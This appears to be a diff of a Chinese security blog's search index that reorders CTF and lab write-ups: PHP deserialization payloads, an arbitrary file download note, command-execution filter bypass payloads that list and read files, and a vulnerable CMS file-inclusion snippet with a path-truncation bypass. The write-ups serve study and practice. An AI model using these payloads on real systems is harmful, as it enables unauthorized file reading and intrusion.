class="line">$aa-&gt;pass=&quot;ok&quot;;</span><br><span class="line">$s=serialize($aa);</span><br><span class="line">print_r()</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>payload</p>
-<p>?param=O:7:”mylogin”:2:{s:4:”user”;s:8:”daydream”;s:4:”pass”;s:2:”ok”;}</p>
-<h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">class mylogin&#123;</span><br><span class="line">    var $user;</span><br><span class="line">    var $pass;</span><br><span class="line">    function __construct($user,$pass)&#123;</span><br><span class="line">        $this-&gt;user=$user;</span><br><span class="line">        $this-&gt;pass=$pass;</span><br><span class="line">    &#125;</span><br><span class="line">    function login()&#123;</span><br><span class="line">        if ($this-&gt;user==&quot;daydream&quot; and $this-&gt;pass==&quot;ok&quot;)&#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=unserialize($_COOKIE[&#x27;param&#x27;]);</span><br><span class="line">if($a-&gt;login())</span><br><span class="line">&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>和上一题的payload一样，不过把param后面的值进行url编码</p>
-<p>![img]1671089842139-0a4d683f-f080-41bb-a5dd-22e61914c88e.png)</p>
-]]></content>
-      <categories>
-        <category>反序列化</category>
-      </categories>
-      <tags>
-        <tag>靶场</tag>
       </tags>
   </entry>
   <entry>
@@ -1249,6 +1249,29 @@ https://blog.csdn.net/weixin_39190897/article/details/85334893]]></content>
       </tags>
   </entry>
   <entry>
+    <title>下载漏洞</title>
+    <url>/2023/01/07/%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<p><img src="/2023/01/07/%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/1669683675716-f18bc2ba-a42a-4d5b-b82c-801f7ce4454f.png" alt="img"></p>
+<span id="more"></span>
+
+<p>随即点击一个图片下载</p>
+<p>查看下载地址</p>
+<p><img src="/2023/01/07/%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/1669683714398-272eb1f2-03b7-4cf1-a5c5-4b26e7d7af32.png" alt="img"></p>
+<p>再随机下载一个图片</p>
+<p>查看地址</p>
+<p><img src="/2023/01/07/%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/1669683750235-349e7187-884b-4e63-893c-d7428e584a09.png" alt="img"></p>
+<p>对比地址发现filename以后的文件名不同，其余相同</p>
+<p>我们可以得到filename后面可以任意查看文件的信息</p>
+<p>可以构造payload</p>
+]]></content>
+      <categories>
+        <category>下载漏洞</category>
+      </categories>
+      <tags>
+        <tag>web漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>一道反序列化</title>
     <url>/2023/01/07/%E4%B8%80%E9%81%93%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
     <content><![CDATA[<p><img src="/2023/01/07/%E4%B8%80%E9%81%93%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1670059317609-fcb0c167-5a82-4039-9a87-7fafc8dfa89f.png" alt="img"></p>
@@ -1286,29 +1309,6 @@ https://blog.csdn.net/weixin_39190897/article/details/85334893]]></content>
       </tags>
   </entry>
   <entry>
-    <title>下载漏洞</title>
-    <url>/2023/01/07/%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<p><img src="/2023/01/07/%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/1669683675716-f18bc2ba-a42a-4d5b-b82c-801f7ce4454f.png" alt="img"></p>
-<span id="more"></span>
-
-<p>随即点击一个图片下载</p>
-<p>查看下载地址</p>
-<p><img src="/2023/01/07/%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/1669683714398-272eb1f2-03b7-4cf1-a5c5-4b26e7d7af32.png" alt="img"></p>
-<p>再随机下载一个图片</p>
-<p>查看地址</p>
-<p><img src="/2023/01/07/%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/1669683750235-349e7187-884b-4e63-893c-d7428e584a09.png" alt="img"></p>
-<p>对比地址发现filename以后的文件名不同，其余相同</p>
-<p>我们可以得到filename后面可以任意查看文件的信息</p>
-<p>可以构造payload</p>
-]]></content>
-      <categories>
-        <category>下载漏洞</category>
-      </categories>
-      <tags>
-        <tag>web漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>中间件解析漏洞</title>
     <url>/2023/01/07/%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<h1 id="中间件解析漏洞"><a href="#中间件解析漏洞" class="headerlink" title="中间件解析漏洞"></a>中间件解析漏洞</h1><h2 id="apache解析漏洞"><a href="#apache解析漏洞" class="headerlink" title="apache解析漏洞"></a>apache解析漏洞</h2><p><img src="/2023/01/07/%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/1672991978769-39972392-a80a-4411-9353-09781546a0ef.png" alt="img"></p>
@@ -1329,40 +1329,24 @@ https://blog.csdn.net/weixin_39190897/article/details/85334893]]></content>
       </tags>
   </entry>
   <entry>
-    <title>(图片拼接)NewStarCTF 公开赛赛道week2 MISC Coldwinds&#39;s Desktop(复现)</title>
-    <url>/2023/01/07/%E5%9B%BE%E7%89%87%E6%8B%BC%E6%8E%A5-NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93week2-MISC-Coldwinds-s-Desktop-%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E6%8B%BC%E6%8E%A5-NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93week2-MISC-Coldwinds-s-Desktop-%E5%A4%8D%E7%8E%B0/1668416306569-9aa5a982-43ef-4972-8d43-89b25e435c4a.png" alt="img"></p>
+    <title>命令执行绕过总结</title>
+    <url>/2023/01/07/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<p>  <img src="https://g.csdnimg.cn/static/logo/favicon32.ico" alt="img"><a href="https://blog.csdn.net/qq_44110340/article/details/107532395">命令执行绕过总结_半只特立独行的猪的博客-CSDN博客_命令执行绕过</a> </p>
+<p>php函数操作：<br>scandir(’.’):扫描当前目录<br>localeconv() 函数返回一数组。而数组第一项就是<code>.</code>(用来绕过.过滤)<br>pos(),current():返回数组第一个值<br>print_r(scandir(‘.’)); 查看当前目录下的所有文件名</p>
 <span id="more"></span>
 
-<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E6%8B%BC%E6%8E%A5-NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93week2-MISC-Coldwinds-s-Desktop-%E5%A4%8D%E7%8E%B0/1668416338466-2f76193e-583e-499b-8ff3-fa1025aab6e9.png" alt="img"></p>
-<p>这是一道拼图题目学要用到的工具有ImageMagick 和kali中的gaps</p>
-<p>montage命令使用方法</p>
-<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E6%8B%BC%E6%8E%A5-NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93week2-MISC-Coldwinds-s-Desktop-%E5%A4%8D%E7%8E%B0/1668416702284-25fab834-afb5-454c-b114-d3cf8ae15a9f.png" alt="img"></p>
-<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E6%8B%BC%E6%8E%A5-NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93week2-MISC-Coldwinds-s-Desktop-%E5%A4%8D%E7%8E%B0/1668416734599-45d36a65-a981-4c46-a7f4-cf7179a87021.png" alt="img"></p>
-<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E6%8B%BC%E6%8E%A5-NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93week2-MISC-Coldwinds-s-Desktop-%E5%A4%8D%E7%8E%B0/1668416754918-8efb1efb-f0d5-49ec-8b8a-0f133851f5a8.png" alt="img"></p>
-<p>在图片目录cmd输入命令<code>magick montage *.png -tile 16x9 -geometry +0+0 flag.jpg</code></p>
-<p>-geometry +0+0   这个命令是使整合图片间隙为0</p>
-<p>得到整合图片</p>
-<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E6%8B%BC%E6%8E%A5-NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93week2-MISC-Coldwinds-s-Desktop-%E5%A4%8D%E7%8E%B0/1668416814529-465ef053-f3f1-45ce-8307-206a3c3c89c1.jpeg" alt="img"></p>
-<p>在kali中使用命令<code>gaps --image=flag.jpg --size=30 --population=144 --generations=64 --save</code></p>
-<p>–image 指向拼图的路径</p>
-<p>–size 拼图块的像素尺寸</p>
-<p>–generations 遗传算法的代的数量</p>
-<p>–population 个体数量</p>
-<p>–verbose 每一代训练结束后展示最佳结果</p>
-<p>–save 将拼图还原为图像</p>
-<p>size比较重要，这里影响着图片数量，图片数量要和本来的图片数相等</p>
-<p>原文链接：<a href="https://blog.csdn.net/m0_47643893/article/details/113778577">https://blog.csdn.net/m0_47643893/article/details/113778577</a></p>
-<p>得到拼图</p>
-<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E6%8B%BC%E6%8E%A5-NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93week2-MISC-Coldwinds-s-Desktop-%E5%A4%8D%E7%8E%B0/1668416988841-5b441246-a691-435d-9a19-19db7a378b8f.jpeg" alt="img"></p>
-<p>最后ps得到</p>
-<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E6%8B%BC%E6%8E%A5-NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93week2-MISC-Coldwinds-s-Desktop-%E5%A4%8D%E7%8E%B0/1668417012503-9e5c207f-4f14-4614-bf32-8da22bdc2060.jpg" alt="img"></p>
+<p>数组操作函数：<br>end():数组指针指向最后一位<br>next() 将数组中的内部指针向前移动一位<br>prev() 将数组中的内部指针倒回一位<br>array_reverse(): 将数组颠倒<br>array_rand(): 随机返回数组的键名<br>array_flip()：交换数组的键和值</p>
+<p>读取文件函数<br>file_get_content() :因为et被ban，所以不能使用<br>readfile()<br>highlight_file()<br>show_source()</p>
+<p>另解：c=print_r(scandir(pos(localeconv())));</p>
+<p>查看当前目录所有文件</p>
+<p>c=show_source(next(array_reverse(scandir(pos(localeconv())))));</p>
+<p>读取当前目录倒数第二个文件，得出flag</p>
 ]]></content>
       <categories>
-        <category>图片隐写</category>
+        <category>命令执行</category>
       </categories>
       <tags>
-        <tag>MISC</tag>
+        <tag>web漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -1460,24 +1444,40 @@ https://blog.csdn.net/weixin_39190897/article/details/85334893]]></content>
       </tags>
   </entry>
   <entry>
-    <title>命令执行绕过总结</title>
-    <url>/2023/01/07/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/</url>
-    <content><![CDATA[<p>  <img src="https://g.csdnimg.cn/static/logo/favicon32.ico" alt="img"><a href="https://blog.csdn.net/qq_44110340/article/details/107532395">命令执行绕过总结_半只特立独行的猪的博客-CSDN博客_命令执行绕过</a> </p>
-<p>php函数操作：<br>scandir(’.’):扫描当前目录<br>localeconv() 函数返回一数组。而数组第一项就是<code>.</code>(用来绕过.过滤)<br>pos(),current():返回数组第一个值<br>print_r(scandir(‘.’)); 查看当前目录下的所有文件名</p>
+    <title>(图片拼接)NewStarCTF 公开赛赛道week2 MISC Coldwinds&#39;s Desktop(复现)</title>
+    <url>/2023/01/07/%E5%9B%BE%E7%89%87%E6%8B%BC%E6%8E%A5-NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93week2-MISC-Coldwinds-s-Desktop-%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E6%8B%BC%E6%8E%A5-NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93week2-MISC-Coldwinds-s-Desktop-%E5%A4%8D%E7%8E%B0/1668416306569-9aa5a982-43ef-4972-8d43-89b25e435c4a.png" alt="img"></p>
 <span id="more"></span>
 
-<p>数组操作函数：<br>end():数组指针指向最后一位<br>next() 将数组中的内部指针向前移动一位<br>prev() 将数组中的内部指针倒回一位<br>array_reverse(): 将数组颠倒<br>array_rand(): 随机返回数组的键名<br>array_flip()：交换数组的键和值</p>
-<p>读取文件函数<br>file_get_content() :因为et被ban，所以不能使用<br>readfile()<br>highlight_file()<br>show_source()</p>
-<p>另解：c=print_r(scandir(pos(localeconv())));</p>
-<p>查看当前目录所有文件</p>
-<p>c=show_source(next(array_reverse(scandir(pos(localeconv())))));</p>
-<p>读取当前目录倒数第二个文件，得出flag</p>
+<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E6%8B%BC%E6%8E%A5-NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93week2-MISC-Coldwinds-s-Desktop-%E5%A4%8D%E7%8E%B0/1668416338466-2f76193e-583e-499b-8ff3-fa1025aab6e9.png" alt="img"></p>
+<p>这是一道拼图题目学要用到的工具有ImageMagick 和kali中的gaps</p>
+<p>montage命令使用方法</p>
+<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E6%8B%BC%E6%8E%A5-NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93week2-MISC-Coldwinds-s-Desktop-%E5%A4%8D%E7%8E%B0/1668416702284-25fab834-afb5-454c-b114-d3cf8ae15a9f.png" alt="img"></p>
+<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E6%8B%BC%E6%8E%A5-NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93week2-MISC-Coldwinds-s-Desktop-%E5%A4%8D%E7%8E%B0/1668416734599-45d36a65-a981-4c46-a7f4-cf7179a87021.png" alt="img"></p>
+<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E6%8B%BC%E6%8E%A5-NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93week2-MISC-Coldwinds-s-Desktop-%E5%A4%8D%E7%8E%B0/1668416754918-8efb1efb-f0d5-49ec-8b8a-0f133851f5a8.png" alt="img"></p>
+<p>在图片目录cmd输入命令<code>magick montage *.png -tile 16x9 -geometry +0+0 flag.jpg</code></p>
+<p>-geometry +0+0   这个命令是使整合图片间隙为0</p>
+<p>得到整合图片</p>
+<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E6%8B%BC%E6%8E%A5-NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93week2-MISC-Coldwinds-s-Desktop-%E5%A4%8D%E7%8E%B0/1668416814529-465ef053-f3f1-45ce-8307-206a3c3c89c1.jpeg" alt="img"></p>
+<p>在kali中使用命令<code>gaps --image=flag.jpg --size=30 --population=144 --generations=64 --save</code></p>
+<p>–image 指向拼图的路径</p>
+<p>–size 拼图块的像素尺寸</p>
+<p>–generations 遗传算法的代的数量</p>
+<p>–population 个体数量</p>
+<p>–verbose 每一代训练结束后展示最佳结果</p>
+<p>–save 将拼图还原为图像</p>
+<p>size比较重要，这里影响着图片数量，图片数量要和本来的图片数相等</p>
+<p>原文链接：<a href="https://blog.csdn.net/m0_47643893/article/details/113778577">https://blog.csdn.net/m0_47643893/article/details/113778577</a></p>
+<p>得到拼图</p>
+<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E6%8B%BC%E6%8E%A5-NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93week2-MISC-Coldwinds-s-Desktop-%E5%A4%8D%E7%8E%B0/1668416988841-5b441246-a691-435d-9a19-19db7a378b8f.jpeg" alt="img"></p>
+<p>最后ps得到</p>
+<p><img src="/2023/01/07/%E5%9B%BE%E7%89%87%E6%8B%BC%E6%8E%A5-NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93week2-MISC-Coldwinds-s-Desktop-%E5%A4%8D%E7%8E%B0/1668417012503-9e5c207f-4f14-4614-bf32-8da22bdc2060.jpg" alt="img"></p>
 ]]></content>
       <categories>
-        <category>命令执行</category>
+        <category>图片隐写</category>
       </categories>
       <tags>
-        <tag>web漏洞</tag>
+        <tag>MISC</tag>
       </tags>
   </entry>
   <entry>
@@ -1581,6 +1581,41 @@ https://blog.csdn.net/weixin_39190897/article/details/85334893]]></content>
       </tags>
   </entry>
   <entry>
+    <title>指定后缀文件包含（.php后缀）与 指定前缀文件包含（files）</title>
+    <url>/2023/01/07/%E6%8C%87%E5%AE%9A%E5%90%8E%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88-php%E5%90%8E%E7%BC%80%EF%BC%89%E4%B8%8E-%E6%8C%87%E5%AE%9A%E5%89%8D%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88files%EF%BC%89/</url>
+    <content><![CDATA[<p><img src="/2023/01/07/%E6%8C%87%E5%AE%9A%E5%90%8E%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88-php%E5%90%8E%E7%BC%80%EF%BC%89%E4%B8%8E-%E6%8C%87%E5%AE%9A%E5%89%8D%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88files%EF%BC%89/1672910232518-495a690a-4783-427c-a775-eda71d6f1c4e.png" alt="img"></p>
+<span id="more"></span>
+
+<p><img src="/2023/01/07/%E6%8C%87%E5%AE%9A%E5%90%8E%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88-php%E5%90%8E%E7%BC%80%EF%BC%89%E4%B8%8E-%E6%8C%87%E5%AE%9A%E5%89%8D%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88files%EF%BC%89/1672910568528-ca80407a-37d5-46c5-9a65-d353be949613.png" alt="img"></p>
+<p><img src="/2023/01/07/%E6%8C%87%E5%AE%9A%E5%90%8E%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88-php%E5%90%8E%E7%BC%80%EF%BC%89%E4%B8%8E-%E6%8C%87%E5%AE%9A%E5%89%8D%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88files%EF%BC%89/1672910692582-83b88d68-0c51-4de8-ac64-86e6b897102b.png" alt="img"></p>
+<p><img src="/2023/01/07/%E6%8C%87%E5%AE%9A%E5%90%8E%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88-php%E5%90%8E%E7%BC%80%EF%BC%89%E4%B8%8E-%E6%8C%87%E5%AE%9A%E5%89%8D%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88files%EF%BC%89/1672917386671-e8576ed5-a7c2-4445-b76c-152bf817402b.png" alt="img"></p>
+<h2 id="熊海cms文件包含漏洞-指定前缀files"><a href="#熊海cms文件包含漏洞-指定前缀files" class="headerlink" title="熊海cms文件包含漏洞(指定前缀files/)"></a>熊海cms文件包含漏洞(指定前缀files/)</h2><?php
+
+//单一入口模式
+
+error_reporting(0); //关闭错误显示
+
+$file=addslashes($_GET['r']); //接收文件名
+
+$action=$file==''?'index':$file; //判断为空或者等于index
+
+include('files/'.$action.'.php'); //载入相应文件
+
+?>
+
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>两个index.php文件均为以下内容，代码中对GET传参只进行了一个 addslashes过滤操作，但该操作对预防文件包含没有什么作用，我们只需要在对应的files文件下存在以 .php结尾的文件，即可利用文件名(不包含.php后缀)作为参数 r的内容，达到文件包含的目的</p>
+<p>由于用了 addslashes函数所以不能用%00截断来绕过.php后缀</p>
+<p>可以用………（256个.）</p>
+<p>或者././././(256个./)绕过</p>
+]]></content>
+      <categories>
+        <category>文件包含</category>
+      </categories>
+      <tags>
+        <tag>web漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>(报错注入)[SWPUCTF 2021 新生赛]error(复现)</title>
     <url>/2023/01/07/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-error-%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<p><img src="/2023/01/07/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-error-%E5%A4%8D%E7%8E%B0/1670981836315-077cff39-364a-4d39-b030-9702a7ca1cb6.png" alt="img"></p>
@@ -1622,41 +1657,6 @@ https://blog.csdn.net/weixin_39190897/article/details/85334893]]></content>
 ]]></content>
       <categories>
         <category>SQL注入</category>
-      </categories>
-      <tags>
-        <tag>web漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>指定后缀文件包含（.php后缀）与 指定前缀文件包含（files）</title>
-    <url>/2023/01/07/%E6%8C%87%E5%AE%9A%E5%90%8E%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88-php%E5%90%8E%E7%BC%80%EF%BC%89%E4%B8%8E-%E6%8C%87%E5%AE%9A%E5%89%8D%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88files%EF%BC%89/</url>
-    <content><![CDATA[<p><img src="/2023/01/07/%E6%8C%87%E5%AE%9A%E5%90%8E%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88-php%E5%90%8E%E7%BC%80%EF%BC%89%E4%B8%8E-%E6%8C%87%E5%AE%9A%E5%89%8D%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88files%EF%BC%89/1672910232518-495a690a-4783-427c-a775-eda71d6f1c4e.png" alt="img"></p>
-<span id="more"></span>
-
-<p><img src="/2023/01/07/%E6%8C%87%E5%AE%9A%E5%90%8E%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88-php%E5%90%8E%E7%BC%80%EF%BC%89%E4%B8%8E-%E6%8C%87%E5%AE%9A%E5%89%8D%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88files%EF%BC%89/1672910568528-ca80407a-37d5-46c5-9a65-d353be949613.png" alt="img"></p>
-<p><img src="/2023/01/07/%E6%8C%87%E5%AE%9A%E5%90%8E%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88-php%E5%90%8E%E7%BC%80%EF%BC%89%E4%B8%8E-%E6%8C%87%E5%AE%9A%E5%89%8D%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88files%EF%BC%89/1672910692582-83b88d68-0c51-4de8-ac64-86e6b897102b.png" alt="img"></p>
-<p><img src="/2023/01/07/%E6%8C%87%E5%AE%9A%E5%90%8E%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88-php%E5%90%8E%E7%BC%80%EF%BC%89%E4%B8%8E-%E6%8C%87%E5%AE%9A%E5%89%8D%E7%BC%80%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88files%EF%BC%89/1672917386671-e8576ed5-a7c2-4445-b76c-152bf817402b.png" alt="img"></p>
-<h2 id="熊海cms文件包含漏洞-指定前缀files"><a href="#熊海cms文件包含漏洞-指定前缀files" class="headerlink" title="熊海cms文件包含漏洞(指定前缀files/)"></a>熊海cms文件包含漏洞(指定前缀files/)</h2><?php
-
-//单一入口模式
-
-error_reporting(0); //关闭错误显示
-
-$file=addslashes($_GET['r']); //接收文件名
-
-$action=$file==''?'index':$file; //判断为空或者等于index
-
-include('files/'.$action.'.php'); //载入相应文件
-
-?>
-
-<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>两个index.php文件均为以下内容，代码中对GET传参只进行了一个 addslashes过滤操作，但该操作对预防文件包含没有什么作用，我们只需要在对应的files文件下存在以 .php结尾的文件，即可利用文件名(不包含.php后缀)作为参数 r的内容，达到文件包含的目的</p>
-<p>由于用了 addslashes函数所以不能用%00截断来绕过.php后缀</p>
-<p>可以用………（256个.）</p>
-<p>或者././././(256个./)绕过</p>
-]]></content>
-      <categories>
-        <category>文件包含</category>
       </categories>
       <tags>
         <tag>web漏洞</tag>
